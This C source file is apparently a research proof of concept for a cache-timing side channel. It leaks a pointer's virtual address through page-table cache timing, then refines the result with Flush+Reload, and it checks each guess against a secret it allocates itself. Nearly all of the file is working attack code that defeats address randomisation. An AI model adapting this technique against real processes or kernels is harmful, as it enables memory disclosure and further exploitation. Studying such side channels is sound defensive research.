/* Copyright (c) 2025, Google Inc.
 *
 * Permission to use, copy, modify, and/or distribute this software for any
 * purpose with or without fee is hereby granted, provided that the above
 * copyright notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
 * WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
 * SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
 * WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
 * OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
 * CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE. */

#include "lib.h"




#define MAX_GUESS_BITS 9
#define NUMSETS 256
char* top_pointers[1<<MAX_GUESS_BITS][NUMSETS];
// Technically for the lowest level there should be at most 8 possible
// pages (sharing the same cache line), but it seems to work better leaving
// it at NUMSETS ~ 256 for some reason, even though it's duplicating
// entries.

__attribute__((aligned(4096)))
int main(int argc, char *argv[]) {
  init(argc, argv);

#define NUM_EVICT (64*256)
// Always at the same place, can allocate once forever.
char* eviction_pointers[NUM_EVICT];
  for (int i = 0; i < NUM_EVICT; i++) {
    // 0xfc-0xff (one L0 cache line) is stack area, which is already pretty noisy. Let's allocate
    // eviction buffer here, since we wouldn't be able to leak anything reliably
    // from here anyway.
#if defined(__x86_64__)
    eviction_pointers[i] = alloc_random_page_(0x0000007FffffF000ull, ((long long)0x7d) << 40);
#elif defined(__aarch64__)
    eviction_pointers[i] = alloc_random_page_(0x0000007FffffF000ull, ((long long)0xfd) << 40);
#endif
  }

#define DEBUG_MODE 1

  //char* secret_page = alloc_random_page_(0x0000007FffffF000ull, (((long long)secret64) << 40) | (extra_bit << 39));
  char* secret_ptr = alloc_random_page() + (xorshift128() & 4095);
  volatile char* secret_or_not[1000];
  for (int i = 0; i < 1000; i++) {
    secret_or_not[i] = secret_ptr;
    if (i%2) {
      char* fake_ptr = alloc_random_page() + (xorshift128() & 4095);
      secret_or_not[i] = fake_ptr;
    }
  }

#define ACCESS_SECRET() volatile char dummy_char = *secret_ptr;
#define ACCESS_SECRET_FAKE_OR_NOT(i) volatile char dummy_char = *secret_or_not[i];
#if 1 // FULL EXPLOIT
  uint64_t known_top = 0;
  for (int level = 0; level < 4; level++) {
#if defined(__x86_64__)
    uint32_t guess_bits = 5; // Not 6, as we can only allocate bottom half.
#elif defined(__aarch64__)
    uint32_t guess_bits = 6;
#endif
    if (level != 0) {
      guess_bits = 9;
    }
    uint32_t current_offset = 42 - 9 * level;

    //uint64_t known_mask = 0xfffffc0000000000ull;
    //uint64_t guess_mask = 0x000003fe00000000ull;
    uint64_t known_mask = 0xffffFFFFffffFFFFull << (guess_bits + current_offset);
    uint64_t guess_mask = ((1ull<<guess_bits)-1) << (current_offset);
    //printf("%0lx\n", guess_mask);

#if DEBUG_MODE
    uint64_t secret_bits = (((uintptr_t)secret_ptr) >> current_offset) & ((1<<guess_bits) - 1);
#endif

    for (uint64_t i = 0; i < (1<<guess_bits); i++) {
      for (int j = 0; j < NUMSETS; j++) {
        top_pointers[i][j] = alloc_random_page_(~(known_mask | guess_mask), known_top | (i<<current_offset));
      }
      //printf("%03d %03d %p\n", 0, i, top_pointers[i][0]);
    }

    int64_t avg_timings[1<<MAX_GUESS_BITS] = {0};
    int64_t cnt_all[1<<MAX_GUESS_BITS] = {0};

    int margin = 0;
    int smallest = 1<<30;
    int smallest_for = -1;
    int outer_iterations = 0;
    while (1) {
      outer_iterations++;
      for (int k2 = 0; k2 < 1000; k2++) {
        uint32_t jj = xorshift128();
        uint32_t jjinc = xorshift128() | 1;
        uint32_t kk = xorshift128();
        uint32_t kkinc = xorshift128() | 1;
        uint32_t ll = xorshift128();
        uint32_t llinc = xorshift128() | 1;

        uint32_t timings[1<<MAX_GUESS_BITS] = {0};
        for (int i = 0; i < NUM_EVICT; i++) {
          eviction_pointers[i][0] = 0x41;
        }

        // Access secret.

        mfence();
        ACCESS_SECRET_FAKE_OR_NOT(k2);
        mfence();

        // Time.

        for (int ii = 0; ii < (1<<guess_bits); ii++) {
          uint64_t i = jj & ((1<<guess_bits)-1);
          jj += jjinc;
          uint64_t j = kk % NUMSETS;
          kk += kkinc;
          uint64_t l = ll & 0xff0;
          ll += llinc;
          timings[i] = time_load(top_pointers[i][j] + l);
        }
        for (int i = 0; i < (1<<guess_bits); i++) {
          if (timings[i] > 600) {
            timings[i] = 600;
          }
          if (k2&1) {
            avg_timings[i] -= timings[i];
          }
          else {
            avg_timings[i] += timings[i];
          }
          cnt_all[i]++;
        }
      }

      smallest = 1<<30;
      int next_smallest = 1<<30;
      smallest_for = -1;
      int next_smallest_for = -1;
      int from = 0;

      int to = (1<<guess_bits);
      if (level == 0) {
        to -= 1; // Stack segment and eviction buffer.
        from += 1; // Code segment.
      }
      int avgx = 0;
      int cntx = 0;
      for (int i = from; i < to; i++) {
          int avg = avg_timings[i] * 100 / cnt_all[i];
          if (avg < smallest) {
            smallest = avg;
            smallest_for = i;
          }
          avgx += avg;
          cntx++;
      }
      avgx /= cntx;
// Please uncomment the following line to enable ARM special casing. It is only
// needed for some ARM CPUs.
//#if defined(__x86_64__)
#if 1
      if (1) { // No special case on x86.
#elif defined(__aarch64__)
      if (level < 3) {
#endif
        for (int i = from; i < to; i++) {
            if (smallest_for == i) continue;
            int avg = avg_timings[i] * 100 / cnt_all[i];
            if (avg < next_smallest) {
              next_smallest = avg;
              next_smallest_for = i;
            }
        }
        margin = next_smallest - smallest;
        int required_margin = 10000 / outer_iterations;
        if (level == 3) {
          required_margin = 500 / outer_iterations;
        }
        if (smallest_for >= to - 4) {
          required_margin *= 4; // Often false positives for top pages, let's be
                                // sure before we declare them to be correct.
        }
        if (smallest_for == next_smallest_for - 1 || smallest_for == next_smallest_for + 1) {
          required_margin *= 4; // Often false positives for page right next to
                                // the correct one.
        }
        printf("L%d: margin = %d centicycles (required: % 5d; avgx: %5d) (0x%03x)\n", level, margin, required_margin, avgx, smallest_for);
        if (margin > required_margin) {
          if (smallest_for > 0) {
            // Extra workaround for AMD:
            // We often see similar signal for the next cacheline too
            // (prefetching???).
            int avg_prev = avg_timings[smallest_for-1] * 100 / cnt_all[smallest_for-1];
            int prev_margin = avgx - avg_prev;
            if (prev_margin > required_margin) {
              printf("AMD workaround: noticed that previous is over threshold too, switching.\n");
              smallest_for--;
            }
          }
          break;
        }
      }
      else { // level == 3
        margin = avgx - smallest;
        int threshold = smallest + margin * 0.5; // that's a parameter.
                                                 // 0.25 - 0.50 ???
        int required_margin = 10000 / outer_iterations;
        int is_ok[1<<MAX_GUESS_BITS] = {0};
        for (int i = from; i < to; i++) {
          if (avg_timings[i] * 100 / cnt_all[i] < threshold) {
            is_ok[i] = 1;
          }
        }
        int cnt2 = 0;
        for (int i = from; i < to; i++) {
          int from2 = i - 4;
          if (i % 64 <= 4) from2 = i - i % 64;
          int to2 = i + 4;
          if (i % 64 >= 59) to2 = i + (63 - i % 64);
          int still_ok = 1;
          for (int j = from2; j <= to2; j++) {
            if (!is_ok[j]) still_ok = 0;
          }
          // The following two conditions check if the one entry past the
          // current range is above threshold as expected. Required, as
          // otherwise e.g. correct=60 would also give signal for i=61-63.
          if (to2 != to - 1) {
            if (is_ok[to2 + 1]) still_ok = 0;
          }
          if (from2 != from) {
            if (is_ok[from2 - 1]) still_ok = 0;
          }
          if (still_ok) {
            smallest_for = i;
            cnt2++;
          }
        }
        printf("L%d: margin = %d centicycles (required: % 5d) (threshold: %d cnt: %d)\n", level, margin, required_margin, threshold, cnt2);
        if (cnt2 == 1 && margin > required_margin) {
          printf("Looks good!\n");
          break;
        }
        if (required_margin < 200) {
          // This means we had a lot of trouble guessing. Print state to debug.
          for (int i = 0; i < (1<<guess_bits); i++) {
            char c = ' ';
#if DEBUG_MODE
            if (i == secret_bits) c = '*';
#endif
            printf("--- (%03llx) %016llx: % 6d %c\n", i, (uintptr_t)top_pointers[i][0], avg_timings[i] * 100 / cnt_all[i], c);
          } // sometimes triggers for randomize = 160???
        }
      }
    }
    for (uint64_t i = 0; i < (1<<guess_bits); i++) {
      for (int j = 0; j < NUMSETS; j++) {
        munmap(top_pointers[i][j], 4096);
      }
    }
    const char* str = "???";

#if DEBUG_MODE
    str = (smallest_for == secret_bits) ? "OK" : "BAD";
#endif

    for (int i = 0; i < (1<<guess_bits); i++) {
      char c = ' ';
#if DEBUG_MODE
      if (i == secret_bits) c = '*';
#endif
      printf("(%03llx) %016llx: % 6d %c\n", i, (uintptr_t)top_pointers[i][0], avg_timings[i] * 100 / cnt_all[i], i == smallest_for ? 's' : ' ');
    }
    known_top |= ((uint64_t)smallest_for) << current_offset;
    printf("CURRENT GUESS: %016llx\n", known_top);
    printf("BEST: %p (0x%03x) (%s @ L%d) - margin: %d\n", top_pointers[smallest_for][0], smallest_for, str, level, margin);
#if DEBUG_MODE
    printf("TRUE: %p (0x%03x)\n", secret_ptr, secret_bits);
    if (smallest_for != secret_bits) exit(1);
#endif
    printf("\n");
  }
#else // Just for development, assume we leaked the top.
  printf("TRUE: %p\n", secret_ptr);
  uint64_t known_top = ((uintptr_t)secret_ptr) & 0xFFFFffffFFFF8000ull;
#endif

  // 4096 (page size) * 8 (8 L3 PTEs share the same cache line).
  // If we have noisy earlier stages, you can increase this somewhat.
#define RANGE (4096 * 8)
  uintptr_t min_secret = known_top;
  uintptr_t max_secret = min_secret + RANGE;
  printf("At this point, we narrowed secret to be between 0x%016llx and 0x%016llx\n", min_secret, max_secret);
  printf("\n==== STAGE 2: F+R ====\n\n");
  for (uintptr_t i = min_secret; i < max_secret; i += 4096) {
    alloc_page_at(i);
  }

  uint32_t sum_timings[RANGE / 64] = {0};
  uint32_t avg_timings[RANGE / 64] = {0};
  uint32_t cnt_timings[RANGE / 64] = {0};
  uint64_t aaa = xorshift128() | 1;
  uint64_t aa = xorshift128();
  char* bestguess = NULL;
  int iter = 0;
  while (1) {
    iter++;
    for (int it = 0; it < 1000; it++) {
      aa += aaa;
      uint64_t bb = xorshift128() | 1;

      uint32_t timings[RANGE / 64] = {0};
      for (int i = 0; i < NUM_EVICT; i++) {
        memset(eviction_pointers[i], 0x41, 4096);
      }

      // Access secret.

      mfence();
      ACCESS_SECRET(); // TODO: change to differential
      mfence();

      // Time.


      for (int i = 0; i < RANGE / 64; i++) {
        aa += bb;
        uint64_t i = aa % (RANGE / 64);
        timings[i] = time_load(i * 64 + (char*)min_secret);
      }
      for (int i = 0; i < RANGE / 64; i++) {
        if (timings[i] > 600) continue;
        sum_timings[i] += timings[i];
        cnt_timings[i]++;
      }
    }
    for (int i = 0; i < RANGE / 64; i++) {
      avg_timings[i] = sum_timings[i] * 100 / cnt_timings[i];
    }
    int min_time = 1<<30;
    int minfor = -1;
    int secondmin = 1<<30;
    for (int i = 0; i < RANGE / 64; i++) {
      if (avg_timings[i] < min_time) {
        min_time = avg_timings[i];
        minfor = i;
        bestguess = i * 64 + (char*)min_secret;
      }
    }
    for (int i = 0; i < RANGE / 64; i++) {
      if (avg_timings[i] < secondmin && i != minfor) {
        secondmin = avg_timings[i];
      }
    }
    int margin = secondmin - min_time;
    int required_margin = 1000 / iter;
    printf("margin: %03d (required: %03d) [%03x]\n", margin, required_margin, minfor);
    if (margin > required_margin) break;
  }

  const char* str = "???";
#if DEBUG_MODE
  str = ((secret_ptr - bestguess) | 63) == 63 ? "OK" : "BAD";
  printf("TRUE:  %p [%d]\n", secret_ptr, avg_timings[(secret_ptr - (char*)min_secret) / 64]);
#endif
  printf("GUESS: %p [%d] (%s)\n", bestguess, avg_timings[(bestguess - (char*)min_secret) / 64], str);
}
